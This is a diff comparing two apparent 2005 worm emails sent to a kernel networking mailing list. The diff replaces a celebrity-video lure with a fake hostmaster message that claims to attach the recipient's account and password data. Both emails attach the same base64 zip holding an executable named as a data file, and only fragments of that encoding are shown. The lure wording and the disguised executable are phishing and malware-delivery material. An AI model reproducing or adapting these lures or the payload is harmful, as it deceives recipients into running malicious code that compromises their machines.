@@ -1,30 +1,29 @@
-From: Admin@synergon.hu
-Subject: Paris Hilton & Nicole Richie
-Date: Sat, 17 Dec 2005 07:37:20 GMT
-Message-ID: <db66.2d3e352005bfcc6@synergon.hu>
+From: hostmaster@goofy.zdv.uni-mainz.de.sgi.com
+Subject: Your Password
+Date: Sat, 17 Dec 2005 08:45:47 UTC
+Message-ID: <c7782.1052ad9bc586c8@goofy.zdv.uni-mainz.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==cefd56b.e9e4dcee230a946"
+Content-Type: multipart/mixed; boundary="==6b1bb0050cfca.0"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: e-user@oss.sgi.com
+To: netdev@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==cefd56b.e9e4dcee230a946
+--==6b1bb0050cfca.0
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---==cefd56b.e9e4dcee230a946
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.goofy.zdv.uni-mainz.de
+***** Email: postman@goofy.zdv.uni-mainz.de
+--==6b1bb0050cfca.0
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==cefd56b.e9e4dcee230a946--
+--==6b1bb0050cfca.0--
